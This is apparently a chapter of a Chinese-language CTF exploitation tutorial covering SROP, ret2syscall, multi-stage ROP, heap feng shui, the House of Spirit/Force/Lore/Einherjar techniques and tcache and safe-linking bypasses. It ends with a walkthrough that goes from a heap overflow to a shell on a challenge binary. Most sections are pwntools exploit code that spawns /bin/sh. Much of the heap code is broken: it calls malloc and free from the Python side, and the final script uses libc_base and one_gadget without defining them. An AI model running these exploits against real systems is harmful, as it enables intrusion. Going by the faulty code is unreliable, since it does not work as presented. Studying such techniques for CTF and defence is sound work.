## 13.1 高级 ROP 技术

### 13.1.1 SROP（Sigreturn Oriented Programming）

**原理**：利用 `sigreturn` 系统调用，一次性设置所有寄存器，执行任意系统调用。

**适用场景**：
- 程序中有 `sigreturn` gadget
- 或程序中有 `syscall; ret` gadget

**利用步骤**：

**步骤1：构造 SigreturnFrame**

```python
# exploit.py
from pwn import *

context.arch = 'amd64'

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59              # execve 系统调用号
frame.rdi = binsh_addr      # 第一个参数："/bin/sh"
frame.rsi = 0               # 第二个参数：NULL
frame.rdx = 0               # 第三个参数：NULL
frame.rip = syscall_addr    # 返回地址：syscall; ret
```

**步骤2：触发 sigreturn**

```python
# 方法1：使用 sigreturn gadget
payload = b'A' * offset
payload += p64(sigreturn_addr)  # sigreturn; ret
payload += bytes(frame)           # SigreturnFrame

# 方法2：使用 15 号系统调用（sigreturn）
payload = b'A' * offset
payload += p64(syscall_addr)     # syscall; ret
payload += p64(15)               # 系统调用号：sigreturn
payload += bytes(frame)
```

**步骤3：验证利用**

```bash
python exploit.py | ./vuln
# 获取 shell
```

### 13.1.2 ret2syscall

**原理**：通过串联 gadget，设置系统调用号和参数，执行任意系统调用。

**示例**：执行 `execve("/bin/sh", NULL, NULL)`

**步骤1：查找 gadget**

```bash
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary ./vuln --only "syscall|ret"
```

输出：
```
0x00000000004012b3 : pop rdi ; ret
0x00000000004012b1 : pop rsi ; ret
0x0000000000401221 : pop rdx ; ret
0x000000000040101c : syscall ; ret
```

**步骤2：构造 payload**

```python
# exploit.py
from pwn import *

pop_rdi = 0x4012b3
pop_rsi = 0x4012b1
pop_rdx = 0x401221
syscall = 0x40101c

binsh_addr = 0x7ffff7fc40fa

payload = b'A' * 112

# 设置 execve 的参数
payload += p64(pop_rdi)      # rdi = "/bin/sh"
payload += p64(binsh_addr)
payload += p64(pop_rsi)      # rsi = NULL
payload += p64(0)
payload += p64(pop_rdx)      # rdx = NULL
payload += p64(0)
payload += p64(syscall)      # 执行系统调用

p.send(payload)
```

### 13.1.3 多阶段 ROP

**原理**：如果 payload 太长（超过缓冲区大小），分多次发送。

**示例**：

```python
# 第一阶段：泄露 libc 地址
payload1 = b'A' * 112
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)     # 泄露 puts() 的 GOT 地址
payload1 += p64(puts_plt)     # 调用 puts()
payload1 += p64(main_addr)    # 返回 main（再次利用）

p.send(payload1)
puts_addr = u64(p.recv(8))   # 读取泄露的地址

# 第二阶段：执行 system("/bin/sh")
libc_base = puts_addr - 0x84470
system_addr = libc_base + 0x4f4e0
binsh_addr = libc_base + 0x1b40fa

payload2 = b'A' * 112
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.send(payload2)
p.interactive()
```

## 13.2 Heap Feng Shui 与堆布局

### 13.2.1 Heap Feng Shui 原理

**Heap Feng Shui**（堆风水）是通过精心分配和释放堆块，控制堆布局，为漏洞利用创造条件。

**目标**：
- 让目标 chunk 与攻击 chunk 相邻
- 控制 chunk 的大小和位置
- 绕过堆保护机制

### 13.2.2 堆布局技术

**示例**：让 `buf1` 和 `buf2` 相邻

```c
// vuln.c
char *buf1 = malloc(100);
char *buf2 = malloc(100);

// 释放 buf1，再分配相同大小的 chunk
free(buf1);
char *buf3 = malloc(100);  // buf3 会复用 buf1 的位置
```

**堆布局**：

```
初始状态：
┌─────────┬─────────┐
│  buf1   │  buf2   │
└─────────┴─────────┘

释放 buf1 后：
┌─────────┬─────────┐
│  free   │  buf2   │
└─────────┴─────────┘

分配 buf3 后：
┌─────────┬─────────┐
│  buf3   │  buf2   │
└─────────┴─────────┘
```

### 13.2.3 实战：堆布局绕过 ASLR

**目标**：将 `__malloc_hook` 放置在可控位置。

**步骤**：

1. **分配多个 chunk**：
   ```python
   chunks = []
   for i in range(10):
       chunks.append(malloc(100))
   ```

2. **释放特定 chunk**：
   ```python
   free(chunks[5])   # 释放第 6 个 chunk
   ```

3. **分配精确大小的 chunk**：
   ```python
   # 分配与 chunks[5] 大小相同的 chunk
   buf = malloc(100)  # 会复用 chunks[5] 的位置
   ```

4. **控制 `__malloc_hook`**：
   ```python
   # 修改 __malloc_hook 为 one_gadget
   buf[offset] = p64(one_gadget)
   ```

## 13.3 House of Series

### 13.3.1 House of Spirit

**原理**：伪造 chunk，将其添加到 fastbin，然后分配该 chunk，控制任意地址。

**利用条件**：
- 可以控制 `malloc()` 的大小参数
- 可以写入任意地址

**步骤**：

1. **伪造 chunk**：
   ```python
   # 在目标地址（如 __malloc_hook）前伪造 chunk
   target_addr = __malloc_hook - 0x10
   
   # 伪造 chunk 的 size 字段
   payload = b'A' * offset
   payload += p64(0x51)  # 伪造 chunk 的 size（0x50 大小）
   ```

2. **释放伪造的 chunk**：
   ```python
   # 释放伪造的 chunk（将其添加到 fastbin）
   free(target_addr)
   ```

3. **分配该 chunk**：
   ```python
   # 分配与伪造 chunk 大小相同的 chunk
   buf = malloc(0x40)  # 会返回 target_addr
   
   # 现在可以修改 __malloc_hook
   buf[0x10] = p64(one_gadget)
   ```

### 13.3.2 House of Force

**原理**：通过溢出修改 top chunk 的 size 为超大值，然后分配任意大小的 chunk，覆盖任意地址。

**利用条件**：
- 存在堆溢出漏洞
- 可以控制 top chunk 的 size 字段

**步骤**：

1. **修改 top chunk 的 size**：
   ```python
   # 溢出 buf1，覆盖 top chunk 的 size
   payload = b'A' * 100        # 填充 buf1
   payload += p64(0xffffffffffffffff)  # 修改 top chunk 的 size
   
   p.send(payload)
   ```

2. **分配超大 chunk**：
   ```python
   # 分配 chunk，使其覆盖 __malloc_hook
   target_offset = __malloc_hook - top_chunk_addr - 0x10
   buf = malloc(target_offset)  # 分配超大 chunk
   
   # 现在可以修改 __malloc_hook
   buf[0x10] = p64(one_gadget)
   ```

### 13.3.3 House of Lore

**原理**：通过修改 smallbin 的 `fd` 和 `bk` 指针，实现任意地址写入。

**利用条件**：
- 可以控制 smallbin 的 `fd` 和 `bk` 指针
- 存在 UAF（Use-After-Free）漏洞

**步骤**：

1. **构造伪造的 smallbin**：
   ```python
   # 伪造 smallbin 的 fd 和 bk 指针
   fake_smallbin = p64(target_addr - 0x18)  # fd
   fake_smallbin += p64(target_addr - 0x10) # bk
   ```

2. **触发 smallbin 分配**：
   ```python
   # 分配 smallbin，修改目标地址
   buf = malloc(200)  # 从伪造的 smallbin 分配
   ```

### 13.3.4 House of Einherjar

**原理**：通过修改 chunk 的 `prev_size` 和 `size` 字段，欺骗 `unlink()`，实现任意地址写入。

**利用条件**：
- 可以控制 chunk 的元数据
- 存在 off-by-one 漏洞

**步骤**：

1. **伪造 chunk 元数据**：
   ```python
   # 修改 chunk 的 prev_size 和 size 字段
   payload = b'A' * 100
   payload += p64(0x0)     # prev_size = 0
   payload += p64(0x100)   # size = 0x100（PREV_INUSE = 0）
   ```

2. **触发 unlink**：
   ```python
   # 释放下一个 chunk，触发 unlink
   free(next_chunk)
   
   # 现在可以修改任意地址
   ```

## 13.4 绕过现代堆保护

### 13.4.1 tcache 机制

**tcache**（Thread Local Cache）是 glibc 2.26+ 引入的快速分配缓存机制。

**特点**：
- 单链表，无完整性检查
- 每个线程有 64 个 tcache bin
- 分配/释放速度极快

**绕过**：

**1. Double Free**（双重释放）：
   ```python
   buf = malloc(100)
   free(buf)
   free(buf)  # Double Free（tcache 不检查）
   
   # 现在可以修改 __malloc_hook
   buf2 = malloc(100)
   buf3 = malloc(100)  # 返回相同的地址
   ```

**2. tcache poisoning**（tcache 投毒）：
   ```python
   buf = malloc(100)
   free(buf)
   
   # 修改 tcache 的 fd 指针
   buf[0] = p64(__malloc_hook - 0x10)
   
   # 分配 chunk，修改 __malloc_hook
   buf2 = malloc(100)
   buf3 = malloc(100)  # 返回 __malloc_hook - 0x10
   ```

### 13.4.2 safe-linking

**safe-linking** 是 glibc 2.32+ 引入的保护机制，对 tcache 的 `fd` 指针进行混淆。

**原理**：
```c
// 混淆算法
#define PROTECT_PTR(pos, addr) \
    ((unsigned long) ((pos) >> 12) ^ (unsigned long) (addr))

#define REVEAL_PTR(pos, addr) \
    (((unsigned long) (pos) << 12) ^ (unsigned long) (addr))
```

**绕过**：

**1. 信息泄露**（获取堆地址）：
```python
# 泄露堆地址
heap_addr = u64(p.recv(8))
log.info(f'Heap address: {hex(heap_addr)}')

# 计算混淆后的 fd 指针
fd = (heap_addr >> 12) ^ (target_addr)
```

**2. 修改 fd 指针**：
```python
# 修改 tcache 的 fd 指针（混淆后）
buf[0] = p64(fd)

# 分配 chunk，修改目标地址
buf2 = malloc(100)
buf3 = malloc(100)  # 返回 target_addr
```

## 13.5 实战：从堆溢出到 RCE

### 13.5.1 漏洞发现

**目标**：某 CTF 题目 `heap_lab`

**逆向分析**（IDA Pro）：
```c
// vuln_function()
char *buf1 = malloc(100);
char *buf2 = malloc(100);

gets(buf1);  // 堆溢出
```

**保护检查**：
```bash
checksec --file=heap_lab
```

输出：
```
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

### 13.5.2 漏洞利用

**步骤1：信息泄露（泄露 libc 和堆地址）**

```python
# exploit.py
from pwn import *

p = process('./heap_lab')

# 泄露 libc 地址
p.recvuntil(b'What is your name?\n')
p.sendline(b'%7$s' + b'A' * 100)

puts_addr = u64(p.recv(8))
log.info(f'puts() address: {hex(puts_addr)}')

libc_base = puts_addr - 0x84470
log.info(f'libc base: {hex(libc_base)}')

# 泄露堆地址
p.recvuntil(b'What do you want to say?\n')
p.sendline(b'A' * 100 + p64(0x21) + p64(0xdeadbeef))

heap_addr = u64(p.recv(8)) - 0x10
log.info(f'Heap address: {hex(heap_addr)}')
```

**步骤2：构造 House of Spirit**

```python
# 在 __malloc_hook 前伪造 chunk
__malloc_hook = libc_base + 0x3edb10
one_gadget = libc_base + 0x4f3c2

# 伪造 chunk 的 size 字段
payload = b'A' * 100
payload += p64(0x0)          # prev_size
payload += p64(0x51)          # size（0x50 大小）
payload += p64(__malloc_hook - 0x10)

p.sendline(payload)
```

**步骤3：触发利用**

```python
# 释放伪造的 chunk
free(__malloc_hook - 0x10)

# 分配该 chunk，修改 __malloc_hook
buf = malloc(0x40)
buf[0x10] = p64(one_gadget)

# 触发 __malloc_hook
malloc(100)  # 执行 one_gadget
p.interactive()
```

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './heap_lab'
context.terminal = ['gnome-terminal', '-e']

p = process('./heap_lab')
# p = remote('challenge.ctf.com', 1337)

# 步骤1：信息泄露

puts_addr = u64(p.recv(8))
log.info(f'puts() address: {hex(puts_addr)}')

__malloc_hook = libc_base + 0x3edb10

# 步骤2：构造 House of Spirit
p.recvuntil(b'What do you want to say?\n')

payload = b'A' * 100
payload += p64(0x0)
payload += p64(0x51)
payload += p64(__malloc_hook - 0x10)

p.sendline(payload)

# 步骤3：触发利用
free(__malloc_hook - 0x10)
buf = malloc(0x40)
buf[0x10] = p64(one_gadget)

malloc(100)
p.interactive()
```
